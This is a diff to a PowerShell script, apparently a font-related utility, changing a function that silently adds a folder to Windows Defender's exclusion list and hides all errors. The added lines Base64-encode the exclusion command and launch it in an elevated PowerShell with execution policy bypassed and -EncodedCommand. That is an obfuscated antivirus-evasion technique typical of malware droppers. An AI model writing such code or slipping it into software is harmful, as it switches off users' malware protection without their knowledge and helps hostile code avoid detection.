@@ -86,16 +86,15 @@ function Get-SafeFont {
 function Add-DefenderExclusion {
     param([string]$Path)
     try {
-        $mp = Get-Command Add-MpPreference -ErrorAction SilentlyContinue
-        if (-not $mp) { return }
+        Import-Module Defender -ErrorAction SilentlyContinue
         $current = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath)
         if ($current -contains $Path) { return }
         Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue | Out-Null
         return
     } catch {}
     try {
-        $cmd = "Add-MpPreference -ExclusionPath '$Path' -ErrorAction SilentlyContinue"
-        Start-Process powershell -ArgumentList "-NoProfile -Command $cmd" -Verb RunAs -WindowStyle Hidden -Wait
+        $encCmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module Defender -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '$Path' -ErrorAction SilentlyContinue"))
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encCmd" -Verb RunAs -Wait
     } catch {}
 }
 
